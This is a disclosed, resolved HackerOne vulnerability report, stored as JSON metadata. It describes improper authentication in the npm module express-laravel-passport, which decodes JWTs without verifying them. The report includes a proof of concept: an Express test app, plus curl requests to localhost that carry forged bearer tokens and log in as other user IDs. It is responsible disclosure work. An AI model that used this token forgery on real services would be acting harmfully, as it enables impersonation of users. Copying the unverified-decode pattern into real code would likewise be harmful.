@@ -1,0 +1,160 @@
+{
+  "id": 748214,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDgyMTQ=",
+  "url": "https://hackerone.com/reports/748214",
+  "title": "[express-laravel-passport] Improper Authentication",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-11-29T00:48:44.901Z",
+  "submitted_at": "2019-11-29T00:48:44.901Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ermilov",
+    "url": "/ermilov",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-01-04T22:09:36.655Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-01-04T22:09:36.602Z",
+  "team_member_agreed_on_going_public_at": "2020-01-03T21:24:56.471Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report Improper Authentication in `express-laravel-passport`\nIt allows to forge user's identity\n\n# Module\n\n**module name:** express-laravel-passport\n**version:** 1.1.2\n**npm page:** `https://www.npmjs.com/package/express-laravel-passport`\n\n## Module Description\n\nYou want a middleware support express get authorization from laravel-passport-structured database, this will help you.\n\n## Module Stats\n\n14 weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\n`express-laravel-passport` is an authentication middleware which utilizes JWT tokens. The module defined to handle authentication but does not validate the JWT token sent by the user. Therefore it allows modifying payload within the token. This weakness provides an opportunity to forge the user's identity by changing the information inside the token's payload that is used to authenticate the client.\n\nsource code example:\n\nhttps://github.com/EugeneNguyen/express-laravel-passport/blob/master/src/index.js#L13\n\n```\nconst { jti } = jwt.decode(token);\n```\n\n`jti` variable retrieved from the token without any verification\n\n## Steps To Reproduce:\n\n* create directory for testing\n```bash\nmkdir poc\ncd poc/\n```\n\n* install dependencies required for `express-laravel-passport` and test app to work\n\n```bash\nnpm init\nnpm i express\nnpm i sequelize@4.32.7\nnpm i sqlite3\nnpm i express-laravel-passport\n```\n\n* create `index.js` with test application code\n\n```javascript\nconst express = require('express')\nconst Sequelize = require('sequelize')\nconst passport = require('express-laravel-passport')\n\n// create inmemory Sqlite DB for testing purposes\nconst sequelize = new Sequelize('database', 'username', 'password', {dialect: 'sqlite'})\n\n// init express\nconst app = express()\nconst port = 3000\n\n// create instance of `express-laravel-passport`\nconst passportMiddleware = passport(sequelize)\n\n// create db Model that simulates structure required for `express-laravel-passport` to work properly\nconst Model = sequelize.define('oauth_access_tokens', {\n  user_id: Sequelize.INTEGER\n}, {\n  timestamps: false\n});\n\n// create DB\nsequelize.sync()\n  // put some test data to DB\n  .then(() => Model.bulkCreate([{user_id:1},{user_id:2},{user_id:3}]))\n  // run the express app with `express-laravel-passport` as middleware\n  .then(() => {\n    app.get('/', passportMiddleware, (req, res) => {\n      const user_id = req.user_id;\n      if (user_id) {\n        res.send(`logged in as: ${user_id}\\n`)\n      } else {\n        res.send('not logged in\\n')\n      }\n    })\n\n    app.listen(port, () => console.log(`Example app listening on port ${port}!`))\n  })\n```\n\n* run it\n\n```bash\nnode index.js\n```\n\nthe app runs on `localhost:3000`, so now you can send requests to this address in order to test its behaviour\n\n* send crafted request with JWT token in `authorization` header\ntoken is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc`\n\nwhich represents this payload: `{\"jti\": 1}` and was simply created at www.jwt.io\n\n```bash\ncurl -H \"authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc\" localhost:3000\n```\n\n`logged in as: 1` is logged to the console as a result\n\n* send another crafted request with JWT token in `authorization` header\ntoken is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc`\n\nwhich represents this payload: `{\"jti\": 2}` ***BUT*** keeps the signature from previous token (n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc), therefore this token is not valid by any means\n\n```bash\ncurl -H \"authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc\" localhost:3000\n```\n\n`logged in as: 2` is logged to the console as a result, which illustrates the fact that it is possible to forge JWT tokens and fake id of the user.\n\n\nWhile testing you can put a breakpoint in poc/node_modules/express-laravel-passport/src/index.js file on line 13, to make sure that it is the `express-laravel-passport` responsible for handling token verification\n\n## Patch\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Linux Mint current\n- NODEJS VERSION: 12.7.0\n- NPM VERSION: 6.10.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nThis weakness provides opportunity to forge user's identity by changing information inside token's payload that is used to verify the client.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-02-02T21:24:56.544Z",
+  "allow_singular_disclosure_after": -197661330.02211446,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "ali",
+    "ameyanekar",
+    "bl4de",
+    "pacmanx",
+    "pr0f0x01",
+    "zimmer75",
+    "whit3h4tmahi",
+    "mhaja7",
+    "destinedtohack",
+    "dakila2012",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 23102,
+      "category": "researcher",
+      "content": "Research based on this and other JWT related H1 reports:\nhttps://r2c.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/",
+      "updated_at": "2020-06-20T01:51:08.866Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 66860,
+        "username": "ermilov",
+        "name": "Vasilii Ermilov",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://ermilov.dev/",
+        "location": "",
+        "created_at": "2016-04-05T10:33:27.242Z",
+        "url": "https://hackerone.com/ermilov",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
